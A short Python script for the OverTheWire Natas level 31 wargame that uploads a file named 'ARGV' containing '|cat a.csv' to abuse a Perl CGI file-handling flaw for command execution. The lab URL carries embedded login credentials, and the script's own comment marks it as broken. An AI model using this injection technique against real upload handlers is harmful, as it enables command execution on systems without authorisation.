import requests
session = requests.Session()

# IDEA
# BROKEN NOW

def natas31(url):
    _csv_content = "a,b,c,d,e\n1,2,3,4\nasafe"
    _csv_file = {'upload_file': ("a.csv", _csv_content)}

    _mal_content = "|cat a.csv"
    _mal_file = {'upload_file': ("ARGV", _mal_content)}

    payload = {'filename' : ['a.csv', 'ARGV']}

    response = session.post(url, files=[_csv_file, _mal_file], data=payload)
    print(response.text)

if __name__ == '__main__':
    url = 'http://natas31:hay7aecuungiuKaezuathuk9biin0pu1@natas31.natas.labs.overthewire.org/'
    natas31(url)
